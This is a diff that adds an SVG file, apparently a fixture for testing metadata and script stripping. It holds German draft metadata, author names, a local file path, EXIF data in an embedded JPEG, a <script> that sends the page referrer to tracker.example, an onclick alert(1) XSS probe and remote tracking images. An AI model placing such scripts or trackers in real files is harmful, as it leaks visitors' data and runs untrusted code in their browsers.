@@ -1,0 +1,24 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+     xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"
+     xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd"
+     xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+     width="200" height="200" viewBox="0 0 200 200"
+     inkscape:version="1.1.2 (b8e25be833, 2022-02-05)"
+     sodipodi:docname="C:\Users\daniw\Entwuerfe\Angebot-final-v3.svg">
+  <!-- Entwurf von Dr. Anna Beispiel, Kanzlei Muster -->
+  <title>Interner Entwurf</title>
+  <desc>Nicht an den Kunden geben</desc>
+  <metadata><rdf:RDF><dc:creator>Dr. Anna Beispiel</dc:creator>
+    <dc:title>Angebot Nordstern</dc:title></rdf:RDF></metadata>
+  <sodipodi:namedview inkscape:zoom="1.4" inkscape:cx="100"/>
+  <script>fetch("https://tracker.example/melde?wer=" + document.referrer)</script>
+  <g inkscape:label="Ebene 1" inkscape:groupmode="layer" transform="translate(10,10)">
+    <rect width="80" height="80" fill="#c81e1e" stroke-width="2" onclick="alert(1)"/>
+    <image x="90" y="0" width="80" height="80" xlink:href="data:image/jpeg;base64,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"/>
+    <image x="0" y="90" width="40" height="40" href="https://tracker.example/pixel.png"/>
+    <circle cx="140" cy="140" r="20" style="fill:url(https://fremd.example/m.png)"/>
+    <text x="10" y="180" font-family="serif" font-size="12">Sichtbarer Text</text>
+  </g>
+</svg>
